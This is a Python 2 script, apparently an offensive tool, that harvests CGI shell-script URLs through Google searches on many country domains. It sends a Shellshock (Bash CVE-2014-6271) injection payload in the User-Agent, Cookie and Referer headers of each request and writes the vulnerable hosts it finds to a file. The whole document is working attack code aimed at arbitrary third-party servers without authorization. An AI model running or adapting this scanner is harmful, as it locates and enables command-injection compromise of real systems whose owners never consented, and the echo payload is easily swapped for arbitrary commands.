#!/usr/bin/env python
# encoding: utf-8

import os
import requests
import re
import codecs
import gevent
from gevent.queue import Queue
import random
from google import search

import gevent.monkey
gevent.monkey.patch_socket()

from gevent.pool import Pool


class Shellshock(object):

    def __init__(self):
        self.countrys = []
        self.success_country_queue = Queue()
        self.success_country_list = []
        self.shellshock_urls = []

    def get_suffix(self):
        for country in open('country_suffix.txt', 'r'):
            line = country.split()
            if len(line) == 2:
                self.countrys.append(line[0])

    def get_suffix_queue(self):
        for country in open('country_suffix.txt', 'r'):
            line = country.split(' ')
            if len(line) == 2:
                self.countrys_queue.put(line[0])

    def get_google_domain_name(self, suffix):
        headers = {
                'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36'}
        preffix = 'http://'
        try:
            url = preffix + suffix
            # response = requests.get(url, headers=headers)
            response = requests.get(url)
            # print response.status_code
            if response.status_code == 200:
                self.success_country_queue.put(suffix)
        except Exception, e:
            pass

    def extrace_tld(self, website):
        website_split = website.split('.')
        if len(website_split) == 4:
            return website_split[2] + '.' + website_split[3]
        else:
            return website_split[2]


    def scan(self, url):
        shell = '() { :; } echo "1a8b8e54b53f63a8efae84e064373f19:"'
        headers = {
                'User-Agent': shell,
                'Cookie':shell,
                'Referer':shell
                }
        response = requests.get(url, headers=headers, timeout=10)
        if '1a8b8e54b53f63a8efae84e064373f19' in response.content and url not in self.shellshock_urls:
            print url, ' shellshock successfully......'
            self.shellshock_urls.append(url)

    def queue2list(self):
        while not self.success_country_queue.empty():
            self.success_country_list.append(self.success_country_queue.get())

    def google_search(self):
        # self.queue2list()
        start = 0
        query = 'inurl:cgi-bin filetype:sh'
        country_nums = len(self.success_country_list)
        for page in xrange(1500):
            tld = self.extrace_tld(self.success_country_list[random.randint(0, country_nums - 1)])
            print 'using www.goole.' + tld
            try:
                for url in search(query, tld=tld, lang='en', start=start, num=10, pause=10.0):
                    if 'https' in url:
                        continue
                    print '[*] scanning :', url
                    self.scan(url)
            except Exception, e:
                print e
                tld = self.extrace_tld(self.success_country_list[random.randint(0, country_nums - 1)])
                continue
            start += 10


def main():

    shellshock = Shellshock()

    if not os.path.isfile('./google_urls.txt'):
        shellshock.get_suffix()
        pool = Pool(30)
        pool.join(timeout=20)
        print 'getting google country domain names.....'
        pool.map(shellshock.get_google_domain_name, shellshock.countrys)
        print 'get google country domain names successfully.....'
        fp = open('google_urls.txt', 'w')
        while not shellshock.success_country_queue.empty():
            fp.write(shellshock.success_country_queue.get() + '\n')
        fp.close()
    shellshock.success_country_list = open('google_urls.txt', 'r').readlines()

    shellshock.google_search()
    print '\n' + '-' * 100
    print shellshock.shellshock_urls
    fp = open('shellshock_urls.txt', 'w')
    for url in shellshock.shellshock_urls:
        fp.write(url + '\n')
    fp.close()


if __name__ == '__main__':
    os.system('clear')

    main()
